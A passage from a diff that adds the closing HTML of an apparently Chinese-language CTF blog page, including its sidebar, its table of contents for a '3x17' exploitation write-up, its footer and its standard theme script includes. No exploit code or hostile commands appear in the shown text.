+                <i class="fa fa-chevron-left"></i> [KERNEL UAF]ciscn2017-babydriver
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#3x17"><span class="nav-number">1.</span> <span class="nav-text">3x17</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">1.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main函数启动过程"><span class="nav-number">1.1.1.</span> <span class="nav-text">main函数启动过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">1.2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检查"><span class="nav-number">1.2.1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RE"><span class="nav-number">1.2.2.</span> <span class="nav-text">RE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法"><span class="nav-number">1.3.</span> <span class="nav-text">利用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#无限次写"><span class="nav-number">1.3.1.</span> <span class="nav-text">无限次写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP"><span class="nav-number">1.3.2.</span> <span class="nav-text">ROP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Expliot"><span class="nav-number">1.4.</span> <span class="nav-text">Expliot</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
